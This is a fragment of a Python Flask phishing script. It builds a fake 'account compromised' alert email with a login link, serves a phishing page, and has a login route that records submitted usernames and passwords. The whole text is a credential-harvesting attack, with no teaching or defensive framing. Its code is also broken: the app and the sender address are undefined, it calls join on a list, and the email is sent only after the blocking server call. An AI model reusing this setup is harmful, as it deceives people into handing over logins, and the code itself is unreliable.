receiver_email = "testuser@example.com"
subject = "Security Alert: Your Account Is Compromised"
message = f"Dear {receiver_email},\nYour account has been compromised. Please click here to log in: http://localhost:5000/login"

# Create a list to store captured data
captured_data = []

@app.route('/')
def home():
    return render_template('phishing.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    captured_data.append(f"User {username}, {password}")
    return render_template('success.html')

if __name__ == "__main__":
    # Run Flask app
    app.run(debug=True)

    # Send the phishing email
    server = SMTP('localhost', 1025)
    server.sendmail(sender_email, receiver_email, message.split('\n').join('\n'))
    print("Email sent successfully!")
    server.quit()
